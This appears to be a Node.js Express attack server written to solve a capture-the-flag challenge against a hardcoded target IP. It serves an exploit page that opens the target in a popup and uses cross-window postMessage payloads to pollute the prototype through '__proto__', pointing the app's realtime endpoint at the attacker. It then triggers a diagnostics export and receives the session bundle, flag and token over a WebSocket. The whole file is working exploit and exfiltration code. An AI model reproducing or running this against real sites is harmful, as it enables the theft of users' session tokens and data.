const express = require('express');
const expressWs = require('express-ws');

const app = express();
expressWs(app);

const PORT = process.env.PORT || 10000;
const TARGET = 'http://34.118.127.209:35666/';

const EXPLOIT_HTML = `<!DOCTYPE html>
<html><head><title>x</title></head>
<body>
<script>
(function(){
  var T = '__TARGET__';
  var W = '__WS_URL__';

  function L(m){
    try{ new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now(); }catch(e){}
  }

  L('page_loaded');

  var pop = null;
  try {
    pop = window.open(T);
    L('popup=' + (pop ? 'ok' : 'null'));
  } catch(e){ L('popup_err=' + e.message); }

  function pollute(w) {
    try {
      var inner = JSON.parse(
        '{"__proto__":{"telemetryConsent":true,' +
        '"channelMode":"ws",' +
        '"realtimeEndpoint":"' + W + '"}}'
      );
      w.postMessage({type:'prefs:update', payload:{theme: inner}}, '*');
      L('pollute_sent');
    } catch(e){ L('pollute_err=' + e.message); }
  }

  function trigger(w) {
    try {
      w.postMessage({type:'diagnostics:export'}, '*');
      L('trigger_sent');
    } catch(e){ L('trigger_err=' + e.message); }
  }

  function round() {
    if (!pop || pop.closed) { L('pop_gone'); return; }
    try { L('pop.length=' + pop.length); } catch(e){ L('pop.length=err'); }
    pollute(pop);
    setTimeout(function(){ trigger(pop); }, 600);
  }

  var times = [1500, 3000, 5000, 7000, 10000, 14000];
  times.forEach(function(d){ setTimeout(round, d); });
})();
<\/script>
</body></html>`;

// GET / — serve exploit page
app.get('/', (req, res) => {
  const host = req.headers.host || req.hostname;
  const wsUrl = 'wss://' + host + '/ws';
  const html = EXPLOIT_HTML
    .replace(/__TARGET__/g, TARGET)
    .replace(/__WS_URL__/g, wsUrl);
  res.type('html').send(html);
});

// GET /log — beacon logger
app.get('/log', (req, res) => {
  const qs = req.query;
  const keys = Object.keys(qs).filter(k => k !== '_');
  console.log('[beacon]', keys.length ? keys.join('&') : req.originalUrl);
  res.status(204).end();
});

// WS /ws — receive exfiltrated data
app.ws('/ws', (ws, req) => {
  console.log('[ws] connection from', req.ip);
  ws.on('message', (data) => {
    console.log('\n' + '='.repeat(62));
    console.log('  EXFILTRATED DIAGNOSTICS BUNDLE');
    console.log('='.repeat(62));
    try {
      const d = JSON.parse(data);
      console.log(JSON.stringify(d, null, 2));
      const s = d.session || {};
      if (s.flag) console.log('\n  >>> FLAG  =', s.flag);
      if (s.token) console.log('  >>> TOKEN =', s.token);
    } catch(e) {
      console.log(String(data).slice(0, 2000));
    }
    console.log('='.repeat(62) + '\n');
  });
  ws.on('close', () => console.log('[ws] closed'));
});

app.listen(PORT, () => {
  console.log('Listening on port', PORT);
});
